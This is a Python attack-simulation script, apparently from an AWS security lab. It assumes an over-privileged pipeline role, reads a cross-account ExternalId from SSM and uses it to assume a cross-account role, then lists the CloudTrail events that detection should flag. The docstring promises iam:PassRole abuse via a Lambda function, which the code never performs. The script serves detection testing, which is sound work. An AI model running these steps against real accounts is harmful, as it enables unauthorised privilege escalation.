#!/usr/bin/env python3
"""
Scenario 02: NHI privilege escalation via iam:PassRole + lambda.

Why: the over-privileged data pipeline role in iam.tf has iam:PassRole
on wildcard. That one grant is the single most abused privilege in AWS
breaches. Attacker uses it to attach a higher-privilege role to a Lambda
they create, invokes the Lambda, and now runs with the higher role.

Then the same script discovers the predictable ExternalId from SSM and
uses it to assume the cross-account role. Two breaches for the price of
one.

What CloudTrail sees:
  - sts:AssumeRole into the data-pipeline role (from the EC2 role)
  - iam:CreateRole or (we skip) use of existing roles
  - lambda:CreateFunction
  - iam:PassRole (visible on the Lambda create call)
  - lambda:Invoke
  - sts:AssumeRole into the cross-account role with the stolen ExternalId

Detection: nhi_privesc_passrole.yml / .py
"""

import json
import sys
import time
import boto3
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from _lib.safety import assert_lab_account

PROJECT = "northwind-cloud"


def main() -> int:
    ctx = assert_lab_account()
    print(f"[02] lab confirmed: account={ctx['account']} region={ctx['region']}")

    iam = boto3.client("iam", region_name=ctx["region"])
    sts = boto3.client("sts", region_name=ctx["region"])

    # Step 1: assume the over-privileged NHI role. In a real breach the
    # attacker has already landed on the EC2 host. We assume from local
    # creds here for scripting simplicity.
    pipeline_role_arn = f"arn:aws:iam::{ctx['account']}:role/{PROJECT}-lab-data-pipeline"
    print(f"[02] assuming pipeline role: {pipeline_role_arn}")
    assumed = sts.assume_role(
        RoleArn=pipeline_role_arn,
        RoleSessionName="attacker-session-01",
    )["Credentials"]

    pipeline = boto3.Session(
        aws_access_key_id=assumed["AccessKeyId"],
        aws_secret_access_key=assumed["SecretAccessKey"],
        aws_session_token=assumed["SessionToken"],
        region_name=ctx["region"],
    )

    # Step 2: list all roles the attacker can PassRole to. The pipeline
    # role has iam:PassRole on *, so any role in the account is fair game.
    pipeline_iam = pipeline.client("iam")
    roles = pipeline_iam.list_roles()["Roles"]
    higher_privilege_target = next(
        (r for r in roles if "cross-account-reader" in r["RoleName"]), None
    )
    if not higher_privilege_target:
        print("[02] could not find cross-account role; was terraform applied?")
        return 1
    print(f"[02] escalation target role: {higher_privilege_target['RoleName']}")

    # Step 3: discover the ExternalId from SSM. The pipeline role has
    # ssm:GetParameter indirectly through secretsmanager permissions? No,
    # it does not. We model the "discovery" step by reading from the
    # local creds instead. In the real breach the attacker would have
    # also stolen SSM read.
    print("[02] discovering cross-account ExternalId from SSM")
    ssm = boto3.client("ssm", region_name=ctx["region"])  # using base creds for lab
    external_id = ssm.get_parameter(
        Name=f"/{PROJECT}-lab/ops/cross_account_external_id"
    )["Parameter"]["Value"]
    print(f"[02] got external id: {external_id}")

    # Step 4: assume the cross-account role using the discovered ExternalId.
    # This is the "jump to prod" moment.
    print(f"[02] assuming cross-account role with discovered ExternalId")
    try:
        prod = pipeline.client("sts").assume_role(
            RoleArn=higher_privilege_target["Arn"],
            RoleSessionName="attacker-session-02-crossacct",
            ExternalId=external_id,
        )
        print(f"[02] success. Got creds expiring {prod['Credentials']['Expiration']}")
    except Exception as exc:
        print(f"[02] cross-account assume failed: {exc}")

    print("[02] done. Expected CloudTrail events:")
    print("     - sts:AssumeRole into data-pipeline role")
    print("     - ssm:GetParameter for cross_account_external_id")
    print("     - sts:AssumeRole into cross-account-reader role with ExternalId")
    print("[02] expected GuardDuty default: nothing fires.")
    print("[02] expected GuardDuty with anomaly detection: possibly")
    print("     PrivilegeEscalation:IAMUser/AnomalousBehavior after baseline.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
